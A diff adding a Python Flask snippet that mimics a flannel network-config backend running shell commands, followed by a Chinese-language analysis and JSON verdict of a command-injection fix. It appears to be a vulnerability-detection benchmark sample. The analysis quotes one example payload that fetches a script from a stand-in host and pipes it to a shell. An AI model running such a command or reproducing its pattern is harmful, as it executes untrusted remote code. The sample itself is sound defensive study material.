@@ -1,0 +1,76 @@
+LANG: python
+```python
+import subprocess
+from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+
+# Simulates flannel extension backend: run shell commands from network config annotations
+NETWORK_CONFIGS = {}
+
+# Whitelist of exactly allowed startup commands (exact-match allowlist defense)
+ALLOWED_COMMANDS = {
+    'ip link set up',
+    'ip route add default via 10.0.0.1',
+    'systemctl restart flanneld',
+}
+
+def _is_allowed(cmd):
+    return cmd in ALLOWED_COMMANDS
+
+@app.route('/networks/<name>/config', methods=['POST'])
+def set_network_config(name):
+    cfg = request.get_json(force=True)
+    NETWORK_CONFIGS[name] = {
+        'pre_startup': cfg.get('preStartupCommand', ''),
+        'post_startup': cfg.get('postStartupCommand', ''),
+    }
+    return jsonify({'status': 'ok'}), 201
+
+@app.route('/networks/<name>/start', methods=['POST'])
+def start_network(name):
+    cfg = NETWORK_CONFIGS.get(name)
+    if not cfg:
+        return jsonify({'error': 'not found'}), 404
+
+    # pre-startup command executed via shell, exactly like the Go original
+    if cfg['pre_startup']:
+        if not _is_allowed(cfg['pre_startup']):
+            return jsonify({'error': 'command not allowed'}), 400
+        proc = subprocess.run(['sh', '-c', cfg['pre_startup']],
+                              capture_output=True, text=True)
+        if proc.returncode != 0:
+            return jsonify({'error': 'pre startup failed', 'output': proc.stderr}), 500
+
+    env = {
+        'NETWORK': name,
+        'PUBLIC_IP': request.args.get('public_ip', ''),
+        'SUBNET': request.args.get('subnet', ''),
+    }
+
+    # post-startup command: attacker-controlled string passed to shell with env vars
+    if cfg['post_startup']:
+        if not _is_allowed(cfg['post_startup']):
+            return jsonify({'error': 'command not allowed'}), 400
+        proc = subprocess.run(['sh', '-c', cfg['post_startup']],
+                              capture_output=True, text=True, env=env)
+        return jsonify({'output': proc.stdout}), 200
+
+    return jsonify({'status': 'started'}), 200
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
+```
+
+分析：
+
+1. 第 22-26 行：用户可控输入点有三处——`set_network_config` 中 `request.get_json(force=True)` 写入的 `preStartupCommand`/`postStartupCommand`（存入 `NETWORK_CONFIGS`），以及第 38-39 行 `request.args.get` 取出的 `public_ip`、`subnet` 查询参数。
+2. 第 33-41 行与第 51-56 行：两条数据流均汇聚到 `subprocess.run(['sh', '-c', cfg[...]])` 这一 sink，攻击者可通过 POST 配置注入任意 shell 命令（如 `preStartupCommand: "curl evil.sh | sh"`），构成 CWE-77 命令注入，主链 source 为 `cfg.get('preStartupCommand')`，sink 为 `sh -c` 执行点。
+3. 第 13-17 行：新增 `_is_allowed` 辅助函数实现白名单精确允许集防御——采用整串 `in` 精确匹配而非子串/前缀判断，杜绝拼接绕过；这是要求 3 认可的白名单精确允许集方案，非黑名单或正则过滤。
+4. 防御位置正确性：校验插入在 sink 调用之前的两个分支入口处（原第 34 行前与第 53 行前），覆盖了全部到达 `subprocess.run` 的路径；未命中白名单直接返回 400，命令字符串永不进入 `sh -c`，类型上比较对象均为 str 与常量集合成员，无类型混淆空间。
+5. 攻击面覆盖完整性：pre_startup 与 post_startup 两条流都被同一 `_is_allowed` 门禁拦截；`env` 中的 `NETWORK/PUBLIC_IP/SUBNET` 仅作为环境变量传入且不再拼入命令串，白名单命令本身不含变量插值，env 注入面同时被封闭。
+6. 第二入口检查：`start_network` 是唯一执行配置命令的路由，无其他 handler 或后台任务读取 `NETWORK_CONFIGS` 并执行；查询参数仅入 env 不入命令行。修复后已无可达的命令注入链。
+
+```json
+{"has_vulnerability": false, "vulnerability_type": "none", "risk_level": "none", "source": "N/A", "sink": "N/A", "explanation": "原代码存在 CWE-77 OS Command Injection：source 为 request.get_json 中的 preStartupCommand/postStartupCommand 字段，经 NETWORK_CONFIGS 存储后流入 subprocess.run 的 sh -c 参数这一 sink，攻击者可注入任意 shell 命令；第二数据流中 public_ip/subnet 查询参数仅作为 env 变量传入不直接拼接命令但整体链路仍受 shell 解释影响；修复采用白名单精确允许集 _is_allowed 在两处 sink 前做整串精确匹配校验，未命中即拒绝执行，所有到达 subprocess.run 的路径均被门禁覆盖", "fix_suggestion": "line 13-17: 新增 ALLOWED_COMMANDS 白名单与 _is_allowed 精确匹配辅助函数，并在 pre_startup 与 post_startup 两处 subprocess.run 调用前插入白名单校验"}
+```
